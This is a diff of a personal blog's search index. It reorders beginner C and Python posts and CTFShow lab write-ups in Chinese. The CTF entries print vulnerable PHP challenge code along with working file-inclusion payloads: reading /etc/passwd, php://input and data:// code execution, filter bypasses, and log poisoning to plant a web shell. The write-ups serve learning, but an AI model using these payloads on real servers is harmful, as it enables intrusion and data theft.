@@ -1,26 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>1 3 3 9 2 7 1 4 4 1 6 6 3 6 1 8 8 6 4 2</title>
-    <url>/2019/08/17/1-3-3-9-2-7-1-4-4-1-6-6-3-6-1-8-8-6-4-2/</url>
-    <content><![CDATA[<h1 id="1-3-3-9-2-7-1-4-4-1-6"><a href="#1-3-3-9-2-7-1-4-4-1-6" class="headerlink" title="1 3 3 9 2 7 1 4 4 1 6"></a>1 3 3 9 2 7 1 4 4 1 6</h1><p>输出数列： 1 3 3 9 2 7 1 4 4 1 6…… 前20项。  </p>
-<p>源代码： </p>
-<a id="more"></a>
-
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"stdio.h"</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 20</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a[N],i,j,t=<span class="number">0</span>;</span><br><span class="line">	a[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">	a[<span class="number">1</span>]=<span class="number">3</span>;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">2</span>;i&lt;N;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			a[i]=a[i<span class="number">-1</span>]*a[i<span class="number">-2</span>];</span><br><span class="line">			t=a[i];</span><br><span class="line">			<span class="keyword">if</span>(t&gt;=<span class="number">10</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					j=t;</span><br><span class="line">					a[i]=t/=<span class="number">10</span>;</span><br><span class="line">					a[++i]=j%=<span class="number">10</span>; </span><br><span class="line">				&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i++)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%d "</span>,a[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>运行结果：</p>
-<p><img src="//czheisenberg.github.io/2019/08/17/1-3-3-9-2-7-1-4-4-1-6-6-3-6-1-8-8-6-4-2/133927.jpg" alt></p>
-]]></content>
-      <categories>
-        <category>C语言</category>
-      </categories>
-      <tags>
-        <tag>C</tag>
-        <tag>C语言数列</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>1+2^2+3^3+4^4+5^5</title>
     <url>/2019/08/06/1-2-2-3-3-4-4-5-5/</url>
     <content><![CDATA[<h1 id="1-2-2-3-3-4-4-5-5"><a href="#1-2-2-3-3-4-4-5-5" class="headerlink" title="1+2^2+3^3+4^4+5^5"></a>1+2^2+3^3+4^4+5^5</h1><p>计算：1+2^2+3^3+4^4+5^5：  </p>
@@ -31,6 +11,26 @@
 
 <p>运行结果：  </p>
 <p><img src="//czheisenberg.github.io/2019/08/06/1-2-2-3-3-4-4-5-5/123.jpg" alt></p>
+]]></content>
+      <categories>
+        <category>C语言</category>
+      </categories>
+      <tags>
+        <tag>C</tag>
+        <tag>C语言数列</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>1 3 3 9 2 7 1 4 4 1 6 6 3 6 1 8 8 6 4 2</title>
+    <url>/2019/08/17/1-3-3-9-2-7-1-4-4-1-6-6-3-6-1-8-8-6-4-2/</url>
+    <content><![CDATA[<h1 id="1-3-3-9-2-7-1-4-4-1-6"><a href="#1-3-3-9-2-7-1-4-4-1-6" class="headerlink" title="1 3 3 9 2 7 1 4 4 1 6"></a>1 3 3 9 2 7 1 4 4 1 6</h1><p>输出数列： 1 3 3 9 2 7 1 4 4 1 6…… 前20项。  </p>
+<p>源代码： </p>
+<a id="more"></a>
+
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"stdio.h"</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 20</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a[N],i,j,t=<span class="number">0</span>;</span><br><span class="line">	a[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">	a[<span class="number">1</span>]=<span class="number">3</span>;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">2</span>;i&lt;N;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			a[i]=a[i<span class="number">-1</span>]*a[i<span class="number">-2</span>];</span><br><span class="line">			t=a[i];</span><br><span class="line">			<span class="keyword">if</span>(t&gt;=<span class="number">10</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					j=t;</span><br><span class="line">					a[i]=t/=<span class="number">10</span>;</span><br><span class="line">					a[++i]=j%=<span class="number">10</span>; </span><br><span class="line">				&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i++)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%d "</span>,a[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行结果：</p>
+<p><img src="//czheisenberg.github.io/2019/08/17/1-3-3-9-2-7-1-4-4-1-6-6-3-6-1-8-8-6-4-2/133927.jpg" alt></p>
 ]]></content>
       <categories>
         <category>C语言</category>
@@ -139,28 +139,6 @@
       </tags>
   </entry>
   <entry>
-    <title>CTFShow PHP特性</title>
-    <url>/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/</url>
-    <content><![CDATA[<h1 id="CTFShow-PHP-特性"><a href="#CTFShow-PHP-特性" class="headerlink" title="CTFShow PHP 特性"></a>CTFShow PHP 特性</h1><h2 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h2><p>源码:</p>
-<a id="more"></a>
-
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-18 16:06:11</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">'num'</span>];</span><br><span class="line">    <span class="keyword">if</span>($num===<span class="string">"4476"</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no no no!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval($num,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> intval($num,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>intval($num,0) 第二位参数为 0</p>
-<p><img src="//czheisenberg.github.io/2021/07/26/CTFShow-PHP特性/web90.png" alt></p>
-<p>iintval() 获取变量的整数值:</p>
-<p><img src="//czheisenberg.github.io/2021/07/26/CTFShow-PHP特性/web90_1.png" alt></p>
-<p>从这可以看出，整个函数只读取了传入的字符串中的数字部分且只取字母前面</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?num=<span class="number">4476</span>a</span><br></pre></td></tr></table></figure>
-
-<p>将 num==4476a 传入将得到 4476 那么 if(intval($num,0) === 4476) 成立 即可获得flag</p>
-<p><img src="//czheisenberg.github.io/2021/07/26/CTFShow-PHP特性/web90_2.png" alt></p>
-]]></content>
-      <categories>
-        <category>CTF笔记</category>
-      </categories>
-  </entry>
-  <entry>
     <title>21世纪的闰年和平年</title>
     <url>/2019/08/06/21%E4%B8%96%E7%BA%AA%E7%9A%84%E9%97%B0%E5%B9%B4%E5%92%8C%E5%B9%B3%E5%B9%B4/</url>
     <content><![CDATA[<h1 id="21世纪的闰年和平年"><a href="#21世纪的闰年和平年" class="headerlink" title="21世纪的闰年和平年"></a>21世纪的闰年和平年</h1><p>源代码： </p>
@@ -200,106 +178,44 @@
       </tags>
   </entry>
   <entry>
-    <title>Painting heart</title>
-    <url>/2019/07/16/Painting-heart/</url>
-    <content><![CDATA[<h1 id="使用python画❤"><a href="#使用python画❤" class="headerlink" title="使用python画❤"></a>使用python画❤</h1><p>利用python画一个❤  </p>
-<p>导入 turtle 库 并起一个别名为： t  </p>
-<p>这样便于操作：  </p>
-<p>有点粗糙！</p>
-<p>源代码：</p>
+    <title>CTFShow PHP特性</title>
+    <url>/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/</url>
+    <content><![CDATA[<h1 id="CTFShow-PHP-特性"><a href="#CTFShow-PHP-特性" class="headerlink" title="CTFShow PHP 特性"></a>CTFShow PHP 特性</h1><h2 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h2><p>源码:</p>
 <a id="more"></a>
 
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> turtle <span class="keyword">as</span> t</span><br><span class="line"><span class="comment">#画人</span></span><br><span class="line">t.color(<span class="string">'black'</span>)</span><br><span class="line">t.pensize(<span class="number">2</span>)</span><br><span class="line">t.circle(<span class="number">40</span>)</span><br><span class="line">t.right(<span class="number">90</span>)</span><br><span class="line">t.forward(<span class="number">110</span>)</span><br><span class="line">t.right(<span class="number">45</span>)</span><br><span class="line">t.forward(<span class="number">60</span>)</span><br><span class="line">t.penup()</span><br><span class="line">t.backward(<span class="number">60</span>)</span><br><span class="line">t.left(<span class="number">43</span>)</span><br><span class="line">t.pendown()</span><br><span class="line">t.goto(<span class="number">45</span>,<span class="number">-111</span>)</span><br><span class="line">t.goto(<span class="number">45</span>,<span class="number">-180</span>)</span><br><span class="line">t.penup()</span><br><span class="line">t.goto(<span class="number">0</span>,<span class="number">-45</span>)</span><br><span class="line">t.left(<span class="number">90</span>)</span><br><span class="line">t.pendown()</span><br><span class="line">t.goto(<span class="number">70</span>,<span class="number">-45</span>)</span><br><span class="line">t.goto(<span class="number">89</span>,<span class="number">-30</span>)</span><br><span class="line">t.penup()</span><br><span class="line">t.goto(<span class="number">0</span>,<span class="number">-55</span>)</span><br><span class="line">t.pendown()</span><br><span class="line">t.goto(<span class="number">72</span>,<span class="number">-55</span>)</span><br><span class="line">t.right(<span class="number">34</span>)</span><br><span class="line">t.forward(<span class="number">22</span>)</span><br><span class="line">t.penup()</span><br><span class="line">t.left(<span class="number">34</span>)</span><br><span class="line">t.goto(<span class="number">199</span>,<span class="number">-50</span>)</span><br><span class="line">t.pendown()</span><br><span class="line"></span><br><span class="line">t.pensize(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">t.delay(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#画❤</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">h</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">200</span>):</span><br><span class="line">        t.right(<span class="number">1</span>)</span><br><span class="line">        t.forward(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">t.color(<span class="string">'red'</span>,<span class="string">'pink'</span>)</span><br><span class="line">t.begin_fill()</span><br><span class="line">t.left(<span class="number">140</span>)</span><br><span class="line">t.forward(<span class="number">111.65</span>)</span><br><span class="line">h()</span><br><span class="line">t.left(<span class="number">120</span>)</span><br><span class="line">h()</span><br><span class="line">t.forward(<span class="number">111.65</span>)</span><br><span class="line">t.end_fill()</span><br><span class="line"></span><br><span class="line">t.hideturtle()</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-18 16:06:11</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">'num'</span>];</span><br><span class="line">    <span class="keyword">if</span>($num===<span class="string">"4476"</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no no no!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval($num,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> intval($num,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>运行结果：  </p>
-<p><img src="//czheisenberg.github.io/2019/07/16/Painting-heart/3.gif" alt></p>
-]]></content>
-      <categories>
-        <category>python</category>
-      </categories>
-      <tags>
-        <tag>python</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CTFShow 文件包含笔记</title>
-    <url>/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/</url>
-    <content><![CDATA[<h1 id="CTFShow-文件包含笔记"><a href="#CTFShow-文件包含笔记" class="headerlink" title="CTFShow 文件包含笔记"></a>CTFShow 文件包含笔记</h1><h2 id="web78——文件包含——php伪协议"><a href="#web78——文件包含——php伪协议" class="headerlink" title="web78——文件包含——php伪协议"></a>web78——文件包含——php伪协议</h2><p>源码:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>intval($num,0) 第二位参数为 0</p>
+<p><img src="//czheisenberg.github.io/2021/07/26/CTFShow-PHP特性/web90.png" alt></p>
+<p>iintval() 获取变量的整数值:</p>
+<p><img src="//czheisenberg.github.io/2021/07/26/CTFShow-PHP特性/web90_1.png" alt></p>
+<p>从这可以看出，整个函数只读取了传入的字符串中的数字部分且只取字母前面</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?num=<span class="number">4476</span>a</span><br></pre></td></tr></table></figure>
 
-<p><strong>方法一：</strong></p>
-<ol>
-<li>尝试是否可以查看 /etc/passwd中的内容: 发现可以查看</li>
-</ol>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=/etc/passwd</span><br></pre></td></tr></table></figure>
-
-<p><img src="//czheisenberg.github.io/2021/07/27/CTFShow-文件包含笔记/web78.png" alt></p>
-<ol start="2">
-<li>尝试使用 php://input 协议:</li>
-</ol>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=php:<span class="comment">//input</span></span><br><span class="line">post:</span><br><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">"ls"</span>);<span class="meta">?&gt;</span> / <span class="meta">&lt;?php</span> system(<span class="string">"tac flag.php"</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="//czheisenberg.github.io/2021/07/27/CTFShow-文件包含笔记/web78_1.png" alt></p>
-<p><img src="//czheisenberg.github.io/2021/07/27/CTFShow-文件包含笔记/web78_2.png" alt></p>
-<p><strong>方法二：</strong></p>
-<pre><code>1. 尝试使用 php://filter/read=convert.base64-encode/resource=flag.php</code></pre><p><img src="//czheisenberg.github.io/2021/07/27/CTFShow-文件包含笔记/web78_3.png" alt></p>
-<p>​    base64解码:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 10:55:11</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 10:55:20</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$flag=<span class="string">"ctfshow&#123;db4b1df7-****-4633-ac61-717d14afa306&#125;"</span>;</span><br></pre></td></tr></table></figure>
-
-<p>​    得到了 flag.</p>
-<h2 id="web79——文件包含"><a href="#web79——文件包含" class="headerlink" title="web79——文件包含"></a>web79——文件包含</h2><p>源码:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:10:14</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 11:12:38</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">    $file = str_replace(<span class="string">"php"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>首先发现题目 使用 str_replace 将php替换为了 ???</p>
-<p><strong>方法一：</strong></p>
-<pre><code>1. 使用 大写 绕过:</code></pre><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=pHp:<span class="comment">//input</span></span><br><span class="line">post:</span><br><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">"ls"</span>);<span class="meta">?&gt;</span> / <span class="meta">&lt;?php</span> system(<span class="string">"tac flag.php"</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="//czheisenberg.github.io/2021/07/27/CTFShow-文件包含笔记/web79.png" alt></p>
-<p><strong>方法二：</strong></p>
-<pre><code>1. 使用 mv 命令 将 flag.php 重命名为 a.txt</code></pre><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=pHp:<span class="comment">//input</span></span><br><span class="line">post:</span><br><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">"mv flag.php a.txt"</span>);<span class="meta">?&gt;</span> / <span class="meta">&lt;?php</span> system(<span class="string">'ls'</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<pre><code>2. 查看 a.txt </code></pre><p><img src="//czheisenberg.github.io/2021/07/27/CTFShow-文件包含笔记/web79_2.png" alt></p>
-<p><strong>方法三：</strong></p>
-<ol>
-<li>使用 data:// 协议:</li>
-</ol>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 未使用 base64 编码</span></span><br><span class="line">?file=data:<span class="comment">//text/plain,<span class="meta">&lt;?pHp</span> system("tac f*");<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="comment">// 使用 base64 编码 </span></span><br><span class="line"><span class="comment">// <span class="meta">&lt;?php</span> system('tac flag.php'); = base64 = PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTs/Pg==</span></span><br><span class="line">?file=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTs/Pg==</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="//czheisenberg.github.io/2021/07/27/CTFShow-文件包含笔记/web79_1.png" alt></p>
-<h2 id="web80——文件包含——日志shell"><a href="#web80——文件包含——日志shell" class="headerlink" title="web80——文件包含——日志shell"></a>web80——文件包含——日志shell</h2><p>源码:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 11:26:29</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">    $file = str_replace(<span class="string">"php"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">"data"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>过滤了 php 和 data:</p>
-<p><strong>方法一：</strong></p>
-<pre><code>1. 尝试使用 php://input：</code></pre><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=pHp:<span class="comment">//input</span></span><br><span class="line">post：</span><br><span class="line">   	<span class="meta">&lt;?php</span> system(<span class="string">'ls'</span>);<span class="meta">?&gt;</span> / <span class="meta">&lt;?php</span> system(<span class="string">'tac fl0g.php'</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="//czheisenberg.github.io/2021/07/27/CTFShow-文件包含笔记/web80.png" alt></p>
-<p><img src="//czheisenberg.github.io/2021/07/27/CTFShow-文件包含笔记/web81_1.png" alt></p>
-<pre><code>2. 尝试使用 data:// 协议并 大写 DATA:// 但绕过失败</code></pre><p><strong>方法二：</strong></p>
-<pre><code>1. 利用 日志 shell ： /var/log/nginx/access.log
-2. bp 中 user-agent 写入一句话</code></pre><p><img src="//czheisenberg.github.io/2021/07/27/CTFShow-文件包含笔记/web80_2.png" alt></p>
-<pre><code>3. 尝试连接:</code></pre><p><img src="//czheisenberg.github.io/2021/07/27/CTFShow-文件包含笔记/web80_3.png" alt></p>
-<p>​    4. 查找 flag（省略）</p>
-<h2 id="web81——文件包含——日志shell"><a href="#web81——文件包含——日志shell" class="headerlink" title="web81——文件包含——日志shell"></a>web81——文件包含——日志shell</h2><p>源码:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">    $file = str_replace(<span class="string">"php"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">"data"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">":"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<ol>
-<li>可以发现文中将 php/data/: 都替换为了 ???;</li>
-<li>尝试是否能查看 服务器日志: ?file=/var/log/nginx/access.log — 成功</li>
-</ol>
-<p><img src="//czheisenberg.github.io/2021/07/27/CTFShow-文件包含笔记/web81.png" alt></p>
-<p>   3.将一句话木马 写入到 User Agent当中: HackBar/Burp:</p>
-<p><img src="//czheisenberg.github.io/2021/07/27/CTFShow-文件包含笔记/web81_1.png" alt></p>
-<p>   4.再次查看日志，日志是否包含了 一句话: — 有</p>
-<p><img src="//czheisenberg.github.io/2021/07/27/CTFShow-文件包含笔记/web81_2.png" alt></p>
-<p>   5.蚁剑/菜刀连接:</p>
-<p><img src="//czheisenberg.github.io/2021/07/27/CTFShow-文件包含笔记/web81_3.png" alt></p>
-<p>   查找flag:</p>
-<p><img src="//czheisenberg.github.io/2021/07/27/CTFShow-文件包含笔记/web81_4.png" alt></p>
+<p>将 num==4476a 传入将得到 4476 那么 if(intval($num,0) === 4476) 成立 即可获得flag</p>
+<p><img src="//czheisenberg.github.io/2021/07/26/CTFShow-PHP特性/web90_2.png" alt></p>
 ]]></content>
       <categories>
         <category>CTF笔记</category>
       </categories>
+  </entry>
+  <entry>
+    <title>Welcome</title>
+    <url>/2019/07/15/Welcome/</url>
+    <content><![CDATA[<h1 id="我的第一个博客"><a href="#我的第一个博客" class="headerlink" title="我的第一个博客"></a>我的第一个博客</h1><p>创建第一个C语言程序“Hello World”<br>源代码：</p>
+<a id="more"></a>
+
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> c</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"stdio.h"</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Hello World!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行结果：<br>Hello World</p>
+<p><img src="//czheisenberg.github.io/2019/07/15/Welcome/1.png" alt></p>
+]]></content>
+      <categories>
+        <category>C语言</category>
+      </categories>
+      <tags>
+        <tag>C</tag>
+      </tags>
   </entry>
   <entry>
     <title>CTFShow Web笔记</title>
@@ -672,6 +588,126 @@
       </categories>
   </entry>
   <entry>
+    <title>CTFShow 文件包含笔记</title>
+    <url>/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<h1 id="CTFShow-文件包含笔记"><a href="#CTFShow-文件包含笔记" class="headerlink" title="CTFShow 文件包含笔记"></a>CTFShow 文件包含笔记</h1><h2 id="web78——文件包含——php伪协议"><a href="#web78——文件包含——php伪协议" class="headerlink" title="web78——文件包含——php伪协议"></a>web78——文件包含——php伪协议</h2><p>源码:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>方法一：</strong></p>
+<ol>
+<li>尝试是否可以查看 /etc/passwd中的内容: 发现可以查看</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=/etc/passwd</span><br></pre></td></tr></table></figure>
+
